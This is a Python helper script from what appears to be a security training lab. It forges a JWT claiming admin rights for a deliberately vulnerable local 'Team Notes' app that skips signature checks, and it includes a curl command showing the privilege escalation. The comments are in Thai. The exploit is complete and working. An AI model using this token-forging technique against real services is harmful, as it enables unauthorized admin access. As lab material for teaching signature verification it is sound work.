#!/usr/bin/env python3
"""Lab 2.3 helper - forge a Team Notes session JWT that claims role=admin.

The vulnerable `main` build does not verify the JWT signature
(`RequireSignedTokens=false` plus a pass-through `SignatureValidator` in
`api/Auth.cs`), so a token signed with ANY key is trusted. This script prints
one such token to stdout so the lab command stays short:

    H=http://127.0.0.1:8080
    FORGED=$(python3 labs/forge_admin_jwt.py)
    curl -s -i -b "session=$FORGED" "$H/api/admin/audit" | head -n 1

On `main` that request returns HTTP 200, on the fixed `solution` it returns 401.
Pass a different signing key as the first argument to prove any key works:

    python3 labs/forge_admin_jwt.py my-own-key
"""
import base64   # แปลง bytes เป็นข้อความ base64url (รูปแบบที่ JWT ใช้)
import hashlib  # ให้ฟังก์ชัน sha256 เป็น hash ของ HMAC
import hmac     # เซ็น signature ของ JWT ด้วย HMAC-SHA256
import json     # แปลง dict ของ payload เป็น JSON string
import sys      # อ่าน argument ที่ส่งมาทาง command line (ใช้เปลี่ยน key)


def b64url(raw: bytes) -> str:
    # เข้ารหัส base64 แบบ URL-safe แล้วตัด '=' ท้ายทิ้ง ตามสเปกของ JWT (base64url ไม่มี padding)
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def forge_admin_token(signing_key: bytes) -> str:
    # ส่วนที่ 1 header: บอกว่าใช้อัลกอริทึม HS256 และชนิดเป็น JWT
    header = b64url(b'{"alg":"HS256","typ":"JWT"}')
    # ส่วนที่ 2 payload: claim ที่เราปลอม ตั้ง role เป็น admin เพื่อยกระดับสิทธิ์
    payload = b64url(
        json.dumps(
            {"userId": 3, "teamId": 1, "role": "admin", "email": "admin@alpha.test"},
            separators=(",", ":"),  # ตัดช่องว่างออกให้ JSON กระชับ (คุม byte ที่เอาไปเซ็น)
        ).encode()
    )
    # ข้อมูลที่ต้องเซ็น = "header.payload" ตามสเปก JWS
    signing_input = f"{header}.{payload}".encode()
    # ส่วนที่ 3 signature: เซ็น signing_input ด้วย HMAC-SHA256 โดยใช้ key ที่เราเลือกเอง
    # จุดสำคัญของ lab: main ไม่ตรวจ signature จึงยอมรับแม้ key นี้ไม่ใช่ key จริงของ server
    signature = b64url(hmac.new(signing_key, signing_input, hashlib.sha256).digest())
    # ประกอบเป็น token เต็มรูปแบบ header.payload.signature
    return f"{header}.{payload}.{signature}"


if __name__ == "__main__":
    # ถ้ามี argument แรกให้ใช้เป็น signing key ถ้าไม่มีก็ใช้ค่า default
    # เปลี่ยน key ได้อิสระเพราะ main ไม่ verify signature อยู่แล้ว (any key ก็ผ่าน)
    key = (sys.argv[1] if len(sys.argv) > 1 else "attacker-chosen-key").encode()
    # พิมพ์ token ออก stdout เพื่อให้ $(...) ใน bash เก็บไปใส่ cookie session ต่อได้
    print(forge_admin_token(key))
